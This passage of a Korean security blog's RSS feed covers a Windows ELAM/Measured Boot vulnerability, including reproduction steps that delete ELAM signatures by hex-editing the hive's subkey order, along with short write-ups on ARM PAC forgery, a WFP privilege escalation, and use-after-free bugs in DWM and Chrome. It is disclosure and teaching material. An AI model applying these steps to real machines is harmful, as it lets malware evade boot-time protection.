순서는 루트 키의 하위 키 목록에있는 키 노드 오프셋 순서를 반영</p></blockquote><p>위는 표준 API 호출을 사용해 “zz” 키를 삽입한 정상적인 레이아웃이다. 공격자는 원하는 다음 레이아웃을 얻기 위해 하위 키 목록을 수정해야 한다.</p><ol><li>Key: zz<ul><li>No values</li></ul></li><li>Key: Windows Defender<ul><li>Value: Measured</li></ul></li></ol><blockquote><p>하위 키 목록에서 두 요소의 순서를 반대로하면 취약점을 트리거할 수 있다.</p></blockquote><br>이제 사전 순 정렬이 깨졌다. <pre><code class="hljs c">Upcase(<span class="hljs-string">&quot;zz&quot;</span>) &gt; Upcase(<span class="hljs-string">&quot;Windows Defender&quot;</span>)</code></pre><p>Windows Kernel은 사전 순 정렬이 깨졌으므로 ELAM 드라이버에서 사용하기 전에 “Windows Defender”키를 삭제한다. 그러나 Windows Loader는 이러한 손상을 인식하지 못하고, 측정할 값이 없는 “zz”키를 건너뛰어 이미 삭제된 “Windows Defender” 키에 있는 “Measured”값을 측정한다. </p><p>결과적으로 이는 ELAM blob이 ELAM 드라이버가 실행되기 전에 삭제될 수 있음을 보여준다.</p><h3 id="Root-cause"><a href="#Root-cause" class="headerlink" title="Root cause"></a>Root cause</h3><p>이 취약점은 Windows Loader가 하위 키 목록에 있는 요소의 사전 순 정렬을 확인하지 않기 때문에 발생한다.</p><p>유니코드 형식의 키 이름이 허용되고, Windows Loader에는 적절한 대소문자 테이블(문자를 대문자로 변환하는 데 사용되는 테이블)이 없어 대소문자를 구분하지 않는 사전 순 정렬을 수행하지 못한다. 따라서 Windows Loader의 해당 기능이 의도적으로 제거된 것이 취약점이 발생한 원인이 되었다.</p><p>유니 코드 대문자 테이블은 Windows Kernel에서 사용되기 때문에 사전 순 정렬은 Kernel에서 구현되었다. 또한 Loader에서 완화된 검사로 인해 Kernel 이전에 로드된 하이브에 대한 검사까지 두 번 수행해야 한다.<br>흥미롭게도, 현재 구현으로는 유니 코드 문자에 대해 리팩토링 할 수 있지만 NLS 테이블을 로드하기 전에 SYSTEM 하이브를 로드해야 한다. </p><h3 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h3><p>Microsoft는 Windows Loader에 사전 순 정렬 검사를 도입하여 취약점을 패치했다. 유니 코드 대문자 테이블은 Windows Loader에서 사용되지 않으므로 ASCII 문자를 사용하는 키 이름으로만 제한된다. 현재 키 이름에 ASCII 문자 외의 형식을 사용하는 ELAM 드라이버는 없는 것으로 확인된다.</p><p>이러한 패치는 SYSTEM 하이브를 검사할 때 심각한 데이터 손상 문제의 원인이 된다. SYSTEM 하이브는 ELAM 하이브와 마찬가지로 초기 부팅 중에 로드되나 ASCII 문자 외 형식의 키를 포함할 수 있다.</p><p>Windows Loader의 유니코드 비교 함수는 유니코드 대문자 테이블을 사용하지 않기 때문에 ASCII 외의 문자를 확인할 수 있는 방법이 없다. 아래 코드는 Windows Kernel에서 두 개의 키 이름 (대소 문자 구분 없음)을 비교하는 데 사용된다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2017.png" alt="measured-boot-vuln/Untitled%2017.png"></p><blockquote><p>유니 코드 문자열을 비교하는 데 사용되는 함수</p></blockquote><p>코드를 보면 알 수 있듯이 “z”(“a”+ 0x19) 보다 높은 코드를 가진 문자의 경우 변환이 수행되지 않는다. 예를 들어 해당 코드에서는 “я”의 대문자 버전은 “Я”이 아니라 “я”이 된다.</p><p>Windows Kernel에서 구현된 동일한 함수는 유니 코드 대문자 테이블을 사용하므로 “я”의 대문자 버전은 “Я”로 정상적으로 변환이 된다. SYSTEM 하이브 내의 하위 키 목록에 있는 요소는 이에 따라 정렬되나 부팅하는 동안에는 Windows Loader의 함수를 사용하여 확인한다.</p><p>따라서 Windows Loader는 올바르게 정렬된 하위 키 목록을 손상된 것으로 간주해 레지스트리 키를 삭제한다.</p><p>해당 이슈를 재현하려면 동일한 상위 레지스트리 키 아래의 SYSTEM 하이브에서 이름이 “я1”및 “Я2”인 두 개의 레지스트리 키를 만든 다음 컴퓨터를 재부팅하면 된다.  Windows Kernel에서는 하위 키 목록이 다음과 같이 정렬된다.</p><ol><li><em>я1</em></li><li><em>Я2</em></li></ol><p>Windows Loader에서는 아래와 같이 인식한다. Loader는 이러한 정렬을 손상된 것으로 인식해 부팅 후 “Я2”키가 삭제되는 것을 확인할 수 있다.</p><pre><code class="hljs c">Upcase (<span class="hljs-string">&quot;я1&quot;</span>)&gt; Upcase (<span class="hljs-string">&quot;Я2&quot;</span>), Upcase (<span class="hljs-string">&quot;я1&quot;</span>) = <span class="hljs-string">&quot;я1&quot;</span></code></pre><p>Microsoft는 취약점을 확인했지만 범위를 벗어났다는 이유로 업데이트하지 않았다.</p><h3 id="Original-vulnerability-report-1"><a href="#Original-vulnerability-report-1" class="headerlink" title="Original vulnerability report"></a>Original vulnerability report</h3><pre><code class="hljs c"># SummaryA malicious usermode program can modify the ELAM hive (&quot;C:\Windows\System32\config\ELAM&quot;), so its blobs (registry values called &quot;Measured&quot;, &quot;Policy&quot;, and &quot;Config&quot;) are correctly measured on the next boot, but the ELAM driver won&#x27;t see them because registry keys containing these blobs are deleted by the NT kernel (even before the BOOT_DRIVER_CALLBACK_FUNCTION callback is registered). This results in proper (expected) PCR values but registry values (the ones previously measured) are absent when the ELAM driver tries to read them. So, the system will boot without proper ELAM signatures and this won&#x27;t affect the measured boot.# Description## Steps to reproduce(Screenshots attached.)<span class="hljs-number">1.</span> Mount the ELAM hive <span class="hljs-keyword">using</span> a registry editor.2. Add the &quot;zz&quot; key under the root key of the ELAM hive, don&#x27;t assign any values to this key (see: &quot;01-regedit.png&quot;).<span class="hljs-number">3.</span> Unmount the ELAM hive.4. Open the ELAM hive file in a HEX editor (you can open it because it&#x27;s not loaded), locate the subkeys list (subkeys of the root key), move the &quot;zz&quot; key to the first position on that list. (A key that was the first one before the move should now occupy the second position on the list. If there are three subkeys, just exchange the first and last keys on the list.)The idea is to <span class="hljs-keyword">break</span> the lexicographical order of subkeys. So, <span class="hljs-string">&quot;1 2&quot;</span> becomes <span class="hljs-string">&quot;2 1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;1 2 3&quot;</span> becomes <span class="hljs-string">&quot;3 2 1&quot;</span> (see: <span class="hljs-string">&quot;02-hexeditor-intact.png&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;03-hexeditor-modified.png&quot;</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&quot;before&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;after&quot;</span> states of the hive file respectively).<span class="hljs-number">5.</span> Reboot the system.6. When the Windows loader (winload.exe or winload.efi) reads the ELAM hive, it doesn&#x27;t check the lexicographical order of subkeys (see: &quot;04-leaf-as-loaded-by-winload.png&quot;). It&#x27;s okay for the Windows loader if subkeys are stored in a wrong order.7. When the Windows loader measures the ELAM hive (in the OslpMeasureEarlyLaunchHive routine), it reads subkeys one-by-one and measures their values (called &quot;Measured&quot;, &quot;Policy&quot;, and &quot;Config&quot;).8. If you manage to break the lexicographical order of subkeys by inserting empty keys and keeping real (non-empty) keys in the same order (relative to each other, not counting the empty keys), then the Windows loader will measure the usual (expected) data. This can be easily demonstrated with one key – &quot;Windows Defender&quot;. If you insert the <span class="hljs-string">&quot;zz&quot;</span> key <span class="hljs-keyword">using</span> a registry editor, it goes to the end of the subkeys <span class="hljs-built_in">list</span>. Like <span class="hljs-keyword">this</span>:- Windows Defender- zzIf you move the &quot;zz&quot; key to the top (using a HEX editor), the lexicographical order is broken, but since the &quot;zz&quot; key has no values, it doesn&#x27;t get measured. And the &quot;Windows Defender&quot; is measured as usual.9. When the NT kernel starts, it takes hives attached to the loader parameter block and validates them. At this point, the validation routine checks the lexicographical order. If a subkeys list isn&#x27;t sorted, offending keys are removed from the list (see: &quot;05-leaf-as-loaded-by-kernel.png&quot;, &quot;06-leaf-as-loaded-by-kernel.png&quot;, and &quot;07-leaf-after-check-by-kernel.png&quot;). This means that the <span class="hljs-string">&quot;Windows Defender&quot;</span> key from the example above is removed.10. When the ELAM driver tries to locate its signatures, they are gone – they were removed by the NT kernel because of the hive format violation (see: &quot;08-leaf-as-seen-by-elam.png&quot;).## Possible solutionsEither check the lexicographical order of subkeys in the Windows loader (which requires you to pick the NLS tables first) or measure empty keys together with non-empty ones.</code></pre><p>취약점의 관련 스크린샷은 아래에 첨부되어 있다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2018.png" alt="measured-boot-vuln/Untitled%2018.png"></p><blockquote><p>01-regedit.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2019.png" alt="measured-boot-vuln/Untitled%2019.png"></p><blockquote><p>02-hexeditor-intact.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2020.png" alt="measured-boot-vuln/Untitled%2020.png"></p><blockquote><p>03-hexeditor-modified.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2021.png" alt="measured-boot-vuln/Untitled%2021.png"></p><blockquote><p>04-leaf-as-loaded-by-winload.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2022.png" alt="measured-boot-vuln/Untitled%2022.png"></p><blockquote><p>05-leaf-as-loaded-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2023.png" alt="measured-boot-vuln/Untitled%2023.png"></p><blockquote><p>06-leaf-as-loaded-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2024.png" alt="measured-boot-vuln/Untitled%2024.png"></p><blockquote><p>07-leaf-after-check-by-kernel.png</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2025.png" alt="measured-boot-vuln/Untitled%2025.png"></p><blockquote><p>08-leaf-as-seen-by-elam.png</p></blockquote><hr>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/boot-security/">boot security</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/27/l0ch/measured-boot-vuln/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] PAC와 PAC Forgery</title>
      <link>https://hackyboiz.github.io/2021/06/27/j0ker/2021-06-27/</link>
      <guid>https://hackyboiz.github.io/2021/06/27/j0ker/2021-06-27/</guid>
      <pubDate>Sun, 27 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://blog.ret2.io/2021/06/16/intro-to-pac-arm</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><p><a href="https://blog.ret2.io/2021/06/16/intro-to-pac-arm64/">https://blog.ret2.io/2021/06/16/intro-to-pac-arm64/</a> </p></li><li><p><a href="https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf">https://events.static.linuxfound.org/sites/events/files/slides/slides_23.pdf</a></p></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&gt; ARMv8.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Fabu1ous님이 말도 없이 제가 하루한줄로 쓰려던 주제를 어제 써버리는 바람에… 오늘은 <code>PAC</code>와 <code>PAC Forgery</code>에 대해서 간단하게 알아보도록 하겠습니다.</p><p><code>PAC</code>는 <code>Pointer Authentication Code</code>의 약자로, 말 그대로 포인터들을 인증하는 미티게이션 기법입니다. <code>ARMv8.3-A</code>부터 지원하며 iOS에서 이 미티게이션을 지원하면서 익스플로잇 난이도가 많이 올라갔다고 합니다.</p><blockquote><p>예… 저는 안해봐서 얼마나 어려운지 모르겠네요…?</p></blockquote><p>안드로이드에서도 지원을 하는지 여부는 제대로 확인을 못해봤습니다. <code>ARMv9</code>로 나오는 Cortex CPU에서 <code>PAC</code>를 지원하는 <a href="https://community.arm.com/developer/ip-products/processors/b/processors-ip-blog/posts/first-armv9-cpu-cores">기사</a>를 봤는데, 혹시 아시는 분이 있으면 댓글 달아주세요 ㅜㅜ</p><p><code>PAC</code>가 동작하는 방식은 매우 “간단”합니다.</p><p>먼저, pac로 시작하는 명령어(ex. <code>paciasp</code>, <code>pacia</code>)를 통해 context와 key 그리고 해당 포인터를 이용해 sign을 합니다. 이 때, key는 128비트 값이며 시스템 레지스터에 저장되어 있는데, 일단 유저 권한에서는 당연히 접근할 수 없습니다. context는 64비트 값을 사용합니다. <code>paciasp</code>를 사용하여 PAC를 생성할 경우, 스택 포인터를 사용합니다.(<code>paciasp</code>의 맨뒤가 sp인 이유)</p><p>그리고 이 세 개의 값은 특정 알고리즘으로 계산되어 PAC를 생성할 수 있는데, 기본적으로 <a href="https://eprint.iacr.org/2016/444.pdf">QARMA</a>를 사용하고 CPU 제조사마다 커스텀이 가능합니다. 이렇게 생성된 <code>PAC</code>는 sign하려고 한 포인터의 상위 주소에 저장됩니다.</p><p>Sign한 뒤, 해당 포인터를 사용할 때에는 먼저 aut로 시작하는 명령어를 사용하여 해당 포인터가 변조되었는지를 확인합니다. 똑같이 포인터 값과 context 그리고 key 값을 사용해 해당 포인터가 정상인지를 검증합니다. 따라서 userspace에서는 <code>PAC</code>생성 알고리즘에서 사용하는 key와 context뿐만 아니라 <code>PAC</code>를 생성하는 알고리즘을 알고 있어야만 알고리즘에 부합하는 값을 얻어낼 수 있습니다.</p><p><code>PAC Forgery</code>는 key와 알고리즘 없이 이를 우회하는 기법입니다.</p><p>첫 번째 블로그의 예시 문제에서는 간단한 버퍼 오버플로우를 통해 <code>LR</code>을 조작할 수 있습니다. 이 문제는 ASLR이 걸려있지 않기 때문에 PAC 생성에 사용되는 스택 주소는 디버깅을 통해 알 수 있습니다.</p><p>그리고 <code>sign_contract()</code>함수를 살펴보면 <code>pacia</code> 명령어를 이용해 특정 레지스터에 대한 PAC를 생성합니다. 이처럼 사용자가 활용할 수 있는 <code>pacia</code> 명령어가 존재하고 context를 알고 있다면 원하는 <code>PAC</code> 코드를 생성할 수 있습니다. 그러면 이런 기능을 활용하여 점프하고 싶은 주소에 대한 <code>PAC</code> 코드를 생성하고 <code>LR</code>에 넣으면 원하는 주소로 점프하여 익스플로잇을 할 수 있게 됩니다.</p><p>다만, 해당 예시 문제는 <code>pacia</code>를 자유롭게 활용할 수 있는 상황이고 <code>ASLR</code>이 안 걸려 있어 익스플로잇하기 매우 쉬운 상황입니다. 리얼월드에서는 기본적으로 <code>information leak</code> 취약점과 pac 명령어들을 활용하는 취약점이 있어야하기 때문에 기본적으로 두개의 취약점을 가지고 있어야 익스플로잇을 해볼 수 있습니다. 이래서 어려운건지 모르겠네요. 언젠가는 제가 직접 익스플로잇을 해보면서 이에 대해 설명하는 글을 써보도록 하겠습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/arm64/">arm64</category>
      
      <category domain="https://hackyboiz.github.io/tags/pac/">pac</category>
      
      <category domain="https://hackyboiz.github.io/tags/pointer-authentication/">pointer authentication</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/27/j0ker/2021-06-27/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-31970: Windows Filtering Platform EoP</title>
      <link>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/</link>
      <guid>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/</guid>
      <pubDate>Sat, 26 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/detail?id</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2175">Windows Filtering Platform Token Access Check EoP</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10 20H2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windows Filtering Platform(WFP)의 TCP/IP 드라이버는 token impersonation level에 대한 검증 미흡으로 발생하는 방화벽 정책 우회 및 권한상승 취약점이 패치되었습니다. </p><p>WFP는 네트워크 필터링을 생성하기 위한 API 및 시스템 서비스들입니다. 소캣에 작업이 들어오면 기본 필터링 엔진 및 Windows 방화벽에서 구성한 정책에 따라 작업이 허용되는지 확인하는데 그 필터링 정책은 호출자의 토큰 상태에 따라 달라집니다. 하지만 이 정책들을 다음과 같은 문제로 인해 우회할 수 있습니다.</p><ul><li><p>PsReferenceImpersonationToken을 호출해 토큰을 TOKEN_ACCESS_INFORMATION 구조체로 변환할 때 impersonation level이 SecurityImpersonation 이상인지 확인하지 않습니다.</p></li><li><p>TCP/IP 드라이버는 토큰 impersonating 도중에 소캣 생성을 허용합니다.</p></li></ul><p>일반 사용자가 시스템 토큰을 캡처하고 impersonat 할 수 있게 되므로 해커는 이를 악용해 방화벽 정책에 의해 명시적으로 허용되지 않는 작업을 수행할 수 있게 됩니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/tcpip/">tcpip</category>
      
      <category domain="https://hackyboiz.github.io/tags/wfp/">wfp</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/26/fabu1ous/2021-06-26/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-33739: Microsoft DWM core library의 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/</link>
      <guid>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/</guid>
      <pubDate>Fri, 25 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg&quot;&gt;https:</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg">https://mp.weixin.qq.com/s/ZjJ4kXOCTSez2erVKYzKbg</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 21H1</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://ko.wikipedia.org/wiki/%EB%8D%B0%EC%8A%A4%ED%81%AC%ED%86%B1_%EC%B0%BD_%EA%B4%80%EB%A6%AC%EC%9E%90">Windows 데스크톱 창 관리자</a>(Desktop Window Manager, dwm.exe)의 <code>dwmcore.dll</code> 모듈에서 UAF로 인한 권한 상승 취약점이 발견되어 세부 정보가 공개되었습니다.</p><p><code>dwmcore.dll</code> 모듈의 <code>CinteractionTrackerBindingManager</code> 객체는 참조 횟수(reference count)를 기준으로 해제 시점이 결정됩니다. 객체를 바인딩하는 경우<code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> 함수를 사용하고 참조 횟수가 1 증가하며, 바인딩 해제하는 경우 <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> 함수를 사용하며 참조 횟수가 1 감소합니다. 참조 횟수가 0이 된 객체는 <code>CMILCOMBase::InternalRelease</code> 함수에 의해 해제됩니다.</p><p>취약점은 같은 객체를 바인딩하는 리소스가 <code>CinteractionTrackerBindingManager</code> 객체를 참조했을 때 발생하며 해커가 DirectComposition API를 사용해 코드 수준에서 트리거가 가능합니다.</p><ol><li><p>동일한 <code>CinteractionTrackerMarshaler</code>를 바인딩하는 두 개의 리소스가 <code>CinteractionTrackerBindingManager</code>을 참조합니다.</p></li><li><p><code>CInteractionTrackerBindingManager::ProcessSetTrackerBindingMode</code> 함수는 동일한 <code>CinteractionTrackerMarshaler</code>에 대해 한 번만 호출되어 참조 횟수는 1 증가합니다.</p></li><li><p>리소스의 사용이 종료되고 해제될 때 <code>CInteractionTrackerBindingManager::RemoveTrackerBindings</code> 함수는 각각의 리소스에 대해 두 번 호출됩니다.</p><ul><li><p>첫 호출 시 <code>CinteractionTrackerBindingManager</code> 객체의 참조 횟수가 1 감소합니다. 0이 된 경우 <code>CMILCOMBase::InternalRelease</code> 함수에 의해 해제됩니다.</p></li><li><p>두 번째 호출 시 해제된 <code>CinteractionTrackerBindingManager</code> 객체에 접근하게 되어 UAF가 트리거 됩니다.</p></li></ul></li></ol><p>공개된 PoC는 <a href="https://github.com/mavillon1/CVE-2021-33739-POC">https://github.com/mavillon1/CVE-2021-33739-POC</a> 에서 확인할 수 있으며  <code>dwmcore.dll</code> 에서는 지난 4월 <a href="https://hackyboiz.github.io/2021/04/15/idioth/2021-04-15/">out of bounds write 취약점(CVE-2021-28310)</a>이 공개되기도 했습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/25/l0ch/2021-06-25/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-30522: Google Chrome WebAudio Code Execution Vulnerability</title>
      <link>https://hackyboiz.github.io/2021/06/24/idioth/2021-06-24/</link>
      <guid>https://hackyboiz.github.io/2021/06/24/idioth/2021-06-24/</guid>
      <pubDate>Thu, 24 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.talosintelligence.com/2021/06/chrome-web-aud</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.talosintelligence.com/2021/06/chrome-web-audio.html">Vulnerability Spotlight: Code execution vulnerability in Google Web Audio API</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Google Chrome 88.0.4324.146 (Official version) (64-bit)</li><li>Google Chrome 90.0.4405.0 (Build) (64-bit)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Google Chrome의 WebAudio <code>blink::AudioNodeOutput::Pull</code>에서 use after-free를 통한 code execution 취약점이 발견되었습니다. 조작된 웹 사이트에 접속하면 취약점이 트리거 되어 코드가 실행됩니다.</p><p>해당 취약점은 <code>blink::AudioNodeOutput::Pull</code> 함수에서 이미 초기화 된 메모리 영역인 <code>in_place_bus</code> (AudioBus 포인터)를 제공받아 발생합니다. WebAudio <code>createGain()</code>이 호출되면 AudioNode 객체 등이 할당되어 출력에 연결됩니다. AudioNode 인터페이스의 <code>connect()</code> 메서드는 노드의 출력 중 하나를 타깃에게 연결합니다. 루프에서 <code>new Float32Array/Uint8Array</code>를 사용하여 인접한 메모리를 연속해서 할당하며 이로 인해 garbage collector가 강제적으로 작동합니다. garbage collection이 수행되는 동안 audio rendering thread는 이미 해제된 AudioNode (AudioOutput)을 참조하므로 use after-free가 발생하며 <code>blink::AudioNodeOutput::Pull</code>은 이 AudioNode 객체를 실행합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/use-after-free/">use after free</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/google/">google</category>
      
      <category domain="https://hackyboiz.github.io/tags/webaduio/">webaduio</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/24/idioth/2021-06-24/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
